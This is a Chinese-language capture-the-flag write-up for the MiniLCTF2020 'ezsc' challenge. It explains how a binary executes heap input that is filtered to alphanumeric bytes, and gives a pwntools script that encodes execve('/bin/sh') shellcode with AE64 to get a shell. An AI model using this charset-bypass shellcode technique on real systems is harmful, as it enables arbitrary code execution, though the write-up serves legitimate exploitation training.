# MiniLCTF2020 - ezsc

## 题目简述

程序逐字节读取输入，只有 `isalnum()` 为真的字节会写入堆缓冲区；遇到第一个非字母数字字节便停止。随后它把缓冲区所在页改为 RWX 并直接调用。因此题目要求构造纯字母数字的 amd64 shellcode。

## 解题过程

当前二进制虽然启用了 Canary、NX 和 Full RELRO，但这些保护不影响程序主动执行堆内存。主函数逻辑等价于：

```c
char *buf = malloc(0x1000);
for (int i = 0; i <= 0xfff; ++i) {
    read(0, &c, 1);
    if (!isalnum(c)) break;
    buf[i] = c;
}
mprotect(page(buf), 0x1000, 7);
((void (*)(void))buf)();
```

仓库附带 `ae64.py`，可把普通 amd64 shellcode编码成只含字母数字的自解码载荷。编码器需要一个指向载荷的基准寄存器；程序调用 `buf` 时 `rax` 恰好保存该地址，因此选择 `rax`：

```python
from pwn import *
from ae64 import AE64

context.arch = 'amd64'
io = process('./pwn')

raw = asm(shellcraft.sh())
encoded = AE64().encode(raw, 'rax')
assert encoded.isalnum()

io.sendline(encoded)
io.interactive()
```

结尾换行不是载荷的一部分；它只让读取循环在存完全部编码字节后停止。自解码 stub 在 RWX 页中恢复并执行原始 `execve('/bin/sh', ...)` shellcode。

## 方法总结

字符集 shellcode 题首先确认输入校验使用的是字节还是 Unicode，以及执行入口时哪些寄存器可作为基址。不要手抄固定长 alpha shellcode：用与架构、基址寄存器匹配的编码器生成，并在发送前断言字符集和长度。
